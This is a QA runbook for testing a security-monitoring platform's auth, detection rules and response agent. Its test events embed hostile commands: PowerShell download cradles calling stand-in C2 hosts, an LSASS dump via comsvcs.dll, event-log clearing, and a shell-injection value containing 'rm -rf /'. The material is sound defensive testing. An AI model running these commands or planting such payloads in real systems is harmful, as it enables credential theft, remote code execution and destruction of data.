# BlueOps — Comprehensive Manual Testing Runbook & Fault-Finding Guide

This runbook provides security architects, QA engineers, and SOC evaluators with an end-to-end, hands-on procedure to manually test every subsystem of **BlueOps** for defects, edge cases, security bypasses, and failure modes.

---

## Table of Contents
1. [Pre-Flight Environment Setup](#1-pre-flight-environment-setup)
2. [Test Suite 1: Authentication & Access Control Boundary](#2-test-suite-1-authentication--access-control-boundary)
3. [Test Suite 2: Telemetry Ingestion & CES Normalization](#3-test-suite-2-telemetry-ingestion--ces-normalization)
4. [Test Suite 3: Sigma Detection Rules & Adversary Evasion](#4-test-suite-3-sigma-detection-rules--adversary-evasion)
5. [Test Suite 4: Multi-Stage Attack Correlation Scenarios](#5-test-suite-4-multi-stage-attack-correlation-scenarios)
6. [Test Suite 5: Authoritative Incident Advisory System (AAS)](#6-test-suite-5-authoritative-incident-advisory-system-aas)
7. [Test Suite 6: Controlled Response & Agent Cryptographic Boundary](#7-test-suite-6-controlled-response--agent-cryptographic-boundary)
8. [Test Suite 7: Forensic Evidence, State Machine & Report Export](#8-test-suite-7-forensic-evidence-state-machine--report-export)
9. [Test Suite 8: Adversary Simulation Console & UI Responsiveness](#9-test-suite-8-adversary-simulation-console--ui-responsiveness)
10. [Troubleshooting & Log Locations](#10-troubleshooting--log-locations)

---

## 1. Pre-Flight Environment Setup

### 1.1 Start Infrastructure Containers
In the root directory of the project, initialize and start the core Docker services:
```bash
docker compose up -d postgres opensearch opensearch-dashboards fluent-bit
```

Verify all containers are healthy:
```bash
docker compose ps
```
*Expected: `postgres`, `opensearch`, `opensearch-dashboards`, and `fluent-bit` report `Up`.*

### 1.2 Start the Backend Service
In a dedicated terminal:
```bash
cd backend
# Windows:
.\mvnw.cmd spring-boot:run
# Linux / macOS:
./mvnw spring-boot:run
```
*Expected output: `Started BlueOpsApplication in X seconds` listening on `http://localhost:8080`.*

### 1.3 Start the Frontend SOC Console
In a second terminal:
```bash
cd frontend
npm run dev
```
*Expected output: `VITE v5.x ready at http://localhost:3000`.*

---

## 2. Test Suite 1: Authentication & Access Control Boundary

### 2.1 Normal Login Verification
1. Open your browser and navigate to `http://localhost:3000`.
2. Log in using each default role:
   - **Admin:** `admin` / `AdminPass123!` (Full permissions)
   - **Analyst:** `analyst` / `AnalystPass123!` (Investigation and response execution)
   - **Viewer:** `viewer` / `ViewerPass123!` (Read-only)
3. *Expected:* Successful JWT authentication redirecting to the SOC Overview dashboard (`/`).

### 2.2 Brute-Force Rate Limiter Lockout Test
Test that the sliding-window brute-force limiter blocks repeated failed authentication attempts:
```powershell
# PowerShell Test:
1..6 | ForEach-Object {
    try {
        Invoke-RestMethod -Uri "http://localhost:8080/api/v1/auth/login" -Method Post `
          -Body (@{ username="admin"; password="WrongPassword123!" } | ConvertTo-Json) `
          -ContentType "application/json"
    } catch {
        Write-Host "Attempt $_ Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
    }
}
```
*Expected:* Attempts 1–5 return `401 Unauthorized`. Attempt 6 returns `429 Too Many Requests` with the message:
`"Account temporarily locked due to excessive failed attempts. Please try again after 15 minutes."`

### 2.3 Role-Based Access Control (RBAC) Barrier Test
1. Log in as `viewer` (`ViewerPass123!`).
2. Attempt to toggle a detection rule or navigate directly to `/detections` edit endpoints.
3. *Expected:* UI hides or disables administrative toggles; REST API calls directly to `POST /api/v1/detections/**` return `403 Forbidden`.

### 2.4 JWT Token Tampering Test
Test that the backend rejects forged or tampered tokens:
```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.tampered.payload" http://localhost:8080/api/v1/incidents
```
*Expected: HTTP `401 Unauthorized` with a log entry: `Invalid JWT token`.*

---

## 3. Test Suite 2: Telemetry Ingestion & CES Normalization

### 3.1 Sysmon Event Ingestion (Windows Endpoint)
First obtain an analyst or admin token:
```powershell
$auth = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/auth/login" -Method Post `
  -Body (@{ username="admin"; password="AdminPass123!" } | ConvertTo-Json) -ContentType "application/json"
$token = $auth.data.token
$headers = @{ Authorization = "Bearer $token" }
```

Send a raw Sysmon process creation event:
```powershell
$sysmonEvent = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    host_ip = "192.168.56.101"
    Image = "C:\Windows\System32\whoami.exe"
    CommandLine = "whoami.exe /all"
    username = "CORP\analyst"
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post `
  -Headers $headers -Body $sysmonEvent -ContentType "application/json"
```

1. Navigate to `http://localhost:3000/telemetry` (Live Telemetry Stream).
2. *Expected:* A new event appears with:
   - Log Source: `windows_sysmon`
   - Host: `WIN-WORKSTATION-01`
   - User: `CORP\analyst`
3. Click the event to open the **JSON Inspector Drawer** and verify the normalized Common Event Schema (CES v1.0.0) fields (`host.os_name = "Windows"`, `process.name = "whoami.exe"`).

### 3.2 Linux Auditd Ingestion
Send a raw Linux auditd execution event:
```powershell
$auditEvent = @{
    provider = "auditd"
    hostname = "LNX-PROD-SRV-01"
    host_ip = "192.168.56.102"
    action = "execve"
    command = "cat /etc/passwd"
    user = "ubuntu"
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post `
  -Headers $headers -Body $auditEvent -ContentType "application/json"
```
*Expected:* Event appears normalized on the live telemetry stream with `host.os_name = "Linux"`, `process.name = "cat"`, and `user.name = "ubuntu"`.

---

## 4. Test Suite 3: Sigma Detection Rules & Adversary Evasion

### 4.1 Rule D008: Obfuscated Encoded PowerShell
Send an encoded PowerShell payload:
```powershell
$payload = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    Image = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine = "powershell.exe -NoLogo -NonI -w hidden -eNCoDeDCoMmAnD SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGwAYQBiAC8AcAAuAHAAcwAxACcAKQA="
    username = "CORP\analyst"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $payload -ContentType "application/json"
$resp.data.triggeredFindings
```
*Expected:* Findings list includes Rule **`D008`** (Suspicious Encoded PowerShell Execution) with Severity `HIGH`, MITRE `T1059.001`.

### 4.2 Rule D008: Unencoded PowerShell Download Cradle
Send a download cradle without Base64 encoding:
```powershell
$cradle = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    Image = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine = "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.lab/payload.ps1')"
    username = "CORP\analyst"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $cradle -ContentType "application/json"
$resp.data.triggeredFindings
```
*Expected:* Findings list triggers Rule **`D008`** (PowerShell Download Cradle / Unencoded Execution).

### 4.3 Rule D011: LSASS Memory Dumping via Comsvcs DLL
```powershell
$lsass = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    Image = "C:\Windows\System32\rundll32.exe"
    CommandLine = "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full"
    username = "SYSTEM"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $lsass -ContentType "application/json"
$resp.data.triggeredFindings
```
*Expected:* Findings list triggers Rule **`D011`** (LSASS Memory Dumping / Credential Harvesting) with Severity `CRITICAL`, MITRE `T1003.001`.

### 4.4 Rule D013: Security Event Log Clearing
```powershell
$logClear = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    Image = "C:\Windows\System32\wevtutil.exe"
    CommandLine = "wevtutil.exe cl Security"
    username = "SYSTEM"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $logClear -ContentType "application/json"
$resp.data.triggeredFindings
```
*Expected:* Findings list triggers Rule **`D013`** with Severity `CRITICAL`, MITRE `T1070.001`.

### 4.5 Rule D015: Threat Intelligence Indicator Match (Case-Insensitive)
Send network telemetry matching known C2 domain `c2-beacon.adversary-lab.internal` in mixed case:
```powershell
$tiEgress = @{
    provider = "Suricata"
    hostname = "WIN-WORKSTATION-01"
    dest_ip = "198.51.100.24"
    dest_port = 4444
    domain = "C2-BEACON.ADVERSARY-LAB.INTERNAL"
    direction = "outbound"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $tiEgress -ContentType "application/json"
$resp.data.triggeredFindings
```
*Expected:* Findings list triggers Rule **`D015`** (Connection to Known Threat Intelligence Indicator: C2-BEACON.ADVERSARY-LAB.INTERNAL).

### 4.6 False Positive Immunity Test (Benign Workloads)
Send standard benign administrator activities:
```powershell
$benign = @{
    provider = "Sysmon"
    EventID = 1
    hostname = "WIN-WORKSTATION-01"
    Image = "C:\Windows\System32\notepad.exe"
    CommandLine = "notepad.exe C:\Users\analyst\meeting_notes.txt"
    username = "CORP\analyst"
} | ConvertTo-Json

$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $benign -ContentType "application/json"
$resp.data.triggeredFindings.Count
```
*Expected: Returns `0` (Zero false positives).*

---

## 5. Test Suite 4: Multi-Stage Attack Correlation Scenarios

### 5.1 Scenario C001: Linux Account Compromise Chain
Execute the multi-stage sequence on asset `LNX-PROD-SRV-01`:
1. Send 3 failed SSH login events (Rule D001).
2. Follow immediately with a successful login event (Rule D002).

```powershell
# 1. Three failed logins
1..3 | ForEach-Object {
    $failed = @{
        provider = "auditd"
        hostname = "LNX-PROD-SRV-01"
        action = "failed_login"
        original = "type=USER_LOGIN res=failed acct=root"
        src_ip = "198.51.100.50"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $failed -ContentType "application/json" | Out-Null
}

# 2. Successful login
$success = @{
    provider = "auditd"
    hostname = "LNX-PROD-SRV-01"
    action = "successful_login"
    original = "type=USER_LOGIN res=success acct=analyst"
    src_ip = "198.51.100.50"
} | ConvertTo-Json
Invoke-RestMethod -Uri "http://localhost:8080/api/v1/telemetry/ingest" -Method Post -Headers $headers -Body $success -ContentType "application/json" | Out-Null
```

1. Open `http://localhost:3000/incidents` in your browser.
2. *Expected:* A new incident is automatically created:
   - **Title:** `[C001] Correlated Attack: Linux Account Compromise & Interactive Root Execution`
   - **Severity:** `HIGH`
   - **Linked Findings:** D001 and D002 are linked as evidence.
   - **Timeline Note:** `Automated Correlation Engine: Detected sequence of findings matching scenario C001 within the correlation window.`

---

## 6. Test Suite 5: Authoritative Incident Advisory System (AAS)

### 6.1 Advisory Rendering & Standard Citations
1. Click on the newly generated incident from Scenario C001 or D011 to enter the **Investigation Workspace** (`/incidents/{id}`).
2. Inspect the **Authoritative Incident Advisor** card at the top of the workspace:
   - *Expected:*
     - Authoritative badges: `NIST SP 800-61r2`, `CISA Federal IR`, `MITRE D3FEND`, or `SANS PICERL`.
     - Priority badge: `IMMEDIATE ACTION` (pulse indicator for High/Critical cases).
     - Standard citations: E.g., `NIST SP 800-61r2 §3.3.1`, `CISA IR Playbook §3.1`.
     - Collapsible SOP section: Click the recommendation to expand the step-by-step checklist.

### 6.2 Copy SOP Checklist to Clipboard Test
1. Click the **"Copy SOP Checklist"** button in the top right of the advisory card.
2. Open a text editor (Notepad, VS Code) and paste (`Ctrl+V`).
3. *Expected:* Formatted Markdown checklist with standard operating procedure steps:
   ```markdown
   # Incident Response Action Plan: Authoritative Standard Operating Procedures
   Frameworks: NIST SP 800-61 Rev. 2, CISA Federal IR Playbooks, MITRE D3FEND, SANS PICERL

   ## 1. [IMMEDIATE_ACTION] Host Network Isolation & Volatile State Preservation
   - **Authoritative Source:** NIST SP 800-61r2 §3.3.1
   ...
   - **Standard Operating Procedure Steps:**
     - [ ] Apply immediate network layer isolation
     - [ ] Capture volatile system memory (RAM)
   ```
4. Verify the UI button temporarily updates to **`Copied SOP!`** with an emerald check icon.

### 6.3 1-Click Response Playbook Dispatch
1. Locate the **"Launch Playbook"** action at the bottom of the advisory recommendation.
2. Click **"Launch Playbook"**.
3. *Expected:* You are immediately navigated to the **Response Console** (`/response`) with:
   - Target Hostname/IP pre-populated.
   - Associated Incident ID pre-linked.
   - Playbook Code selected.

---

## 7. Test Suite 6: Controlled Response & Agent Cryptographic Boundary

### 7.1 Legitimate Playbook Execution (Simulation Mode)
1. In the Response Console (`http://localhost:3000/response`), select:
   - Playbook: `P001 - Isolate Compromised Host`
   - Target: `WIN-ASSET-001`
   - Reason: `Adversary credential dumping detected via comsvcs.dll`
2. Ensure **Simulation Mode** is checked (safe execution).
3. Click **"Execute Response Action"**.
4. *Expected:* Action executes successfully:
   - Target host status updates to `ISOLATED` in the Assets database.
   - An immutable audit trail entry is recorded in `audit_events`.
   - Action status displays `SUCCESS (SIMULATED)`.

### 7.2 Compensating Rollback Verification
1. Click **"Rollback"** on the executed action or execute playbook `P006 - Reconnect Isolated Host`.
2. *Expected:* Host connectivity is restored; asset status transitions back to `HEALTHY`.

### 7.3 Response Agent Cryptographic Security Boundary Tests
To test the response agent boundary directly without the backend:

#### Test A: Invalid HMAC Signature
```bash
curl -i -X POST http://localhost:5000/api/v1/execute \
  -H "Content-Type: application/json" \
  -H "X-BlueOps-Signature: forged_signature_deadbeef" \
  -H "X-BlueOps-Timestamp: $(date +%s)" \
  -H "X-BlueOps-ActionId: act-test-tamper-01" \
  -d '{"action": "BLOCK_IP", "target": "198.51.100.24"}'
```
*Expected: HTTP `401 Unauthorized` with error `HMAC signature mismatch or expired payload`.*

#### Test B: Expired Signature Window (> 60s)
```bash
# Timestamp set to 300 seconds in the past
curl -i -X POST http://localhost:5000/api/v1/execute \
  -H "Content-Type: application/json" \
  -H "X-BlueOps-Signature: valid_or_dummy" \
  -H "X-BlueOps-Timestamp: 1600000000" \
  -H "X-BlueOps-ActionId: act-test-expired-02" \
  -d '{"action": "BLOCK_IP", "target": "198.51.100.24"}'
```
*Expected: HTTP `401 Unauthorized` (rejected expired window).*

#### Test C: Shell Command Injection Attempt
Send a payload containing shell injection metacharacters (`;`, `&`, `|`, `` ` ``):
```bash
# Target containing semicolon command injection
curl -i -X POST http://localhost:5000/api/v1/execute \
  -H "Content-Type: application/json" \
  -H "X-BlueOps-Signature: dummy" \
  -H "X-BlueOps-Timestamp: $(date +%s)" \
  -H "X-BlueOps-ActionId: act-test-inject-03" \
  -d '{"action": "BLOCK_IP", "target": "198.51.100.24; rm -rf /; echo pwned"}'
```
*Expected: HTTP `400 Bad Request` with `REJECTED_INVALID_PARAMETER`.*

#### Test D: Unauthorized Arbitrary Action
```bash
curl -i -X POST http://localhost:5000/api/v1/execute \
  -H "Content-Type: application/json" \
  -H "X-BlueOps-Signature: dummy" \
  -H "X-BlueOps-Timestamp: $(date +%s)" \
  -H "X-BlueOps-ActionId: act-test-unauth-04" \
  -d '{"action": "EXECUTE_REMOTE_SHELL", "target": "whoami"}'
```
*Expected: HTTP `400 Bad Request` with `REJECTED_UNAUTHORIZED_ACTION`.*

---

## 8. Test Suite 7: Forensic Evidence, State Machine & Report Export

### 8.1 Incident State Machine Transition Validation
1. In the Incident Investigation Workspace (`/incidents/{id}`), test state transitions:
   - `NEW` $\to$ `TRIAGED` (Permitted)
   - `TRIAGED` $\to$ `INVESTIGATING` (Permitted)
   - `INVESTIGATING` $\to$ `CONTAINED` (Permitted)
2. Test illegal transition: Attempt to transition directly from `NEW` to `CLOSED`.
   - *Expected:* Backend returns `400 Bad Request` (`Invalid state transition: Cannot transition incident from NEW to CLOSED directly`).

### 8.2 Dynamic Finding Attachment as Forensic Evidence
1. In the investigation workspace, click **"Attach Finding / Evidence"**.
2. Enter finding ID: `FND-D011-1001` (or any active finding ID).
3. Click **"Attach"**.
4. *Expected:*
   - The finding appears in the linked evidence table.
   - An `EVIDENCE_ATTACHED` timeline entry is recorded in the incident history.
   - Attempting to attach the same finding again is gracefully rejected as a duplicate.

### 8.3 Incident Report Export (Markdown & JSON)
1. In the investigation workspace header, click **"Export Markdown"**.
2. Open the downloaded `.md` file.
3. *Expected:* File contains:
   - Incident overview & metadata
   - Forensic evidence finding list with MITRE technique codes
   - Complete timeline history
   - Authoritative advisory recommendations and exact citations
4. Click **"Export JSON"** $\to$ verify the structured JSON matches the schema.

---

## 9. Test Suite 8: Adversary Simulation Console & UI Responsiveness

### 9.1 Interactive Simulation Trigger
1. In the web console, navigate to **Adversary Console** (`http://localhost:3000/adversary`).
2. Review the list of 10 Atomic Red Team scenarios and 8 Deceptive Attack scenarios.
3. Select **`T008 - In-Memory LSASS Credential Harvesting via Comsvcs MiniDump`**.
4. Click **"Execute Attack Simulation"**.
5. *Expected:*
   - The simulation terminal logs real-time execution steps:
     `[SIMULATION DISPATCHED] Atomic Red Team: T008 (T1003.001)`
     `[DETECTION TRIGGERED] Rule D011: LSASS Memory Dumping`
   - Links appear in the execution result to navigate directly to the generated finding and incident.

### 9.2 MITRE ATT&CK Matrix Navigator
1. Navigate to **Detections** (`http://localhost:3000/detections`).
2. Toggle view mode to **"MITRE ATT&CK Heatmap"**.
3. *Expected:*
   - All 18 detection rules appear correctly distributed under their respective ATT&CK Tactics (*Credential Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Command & Control, Impact*).
   - Clicking a rule opens the Sigma YAML viewer with rule metadata, author, and query logic.

---

## 10. Troubleshooting & Log Locations

| Component | Port | Health Endpoint / Verification | Log Location |
|---|---|---|---|
| **Spring Boot Backend** | `8080` | `http://localhost:8080/actuator/health` | Terminal console / `backend.log` |
| **React SOC UI** | `3000` | Browser `http://localhost:3000` | Browser DevTools Console |
| **PostgreSQL 16** | `5432` | `docker exec -it blueops-postgres pg_isready` | `docker logs blueops-postgres` |
| **OpenSearch 2.13** | `9200` | `curl -k http://localhost:9200` | `docker logs blueops-opensearch` |
| **OpenSearch Dashboards** | `5601` | Browser `http://localhost:5601` | `docker logs blueops-dashboards` |
| **Fluent Bit 3.x** | `24224` | `docker logs blueops-fluent-bit` | `docker logs blueops-fluent-bit` |
| **Response Agent** | `5000` | `http://localhost:5000/health` | `docker logs blueops-response-agent` |

### Pipeline Diagnostic Script
To automatically verify that all ports, database connections, and API endpoints are healthy, run:
```powershell
# Windows:
.\scripts\validation\verify_pipeline.ps1

# Linux / macOS:
./scripts/validation/verify_pipeline.sh
```
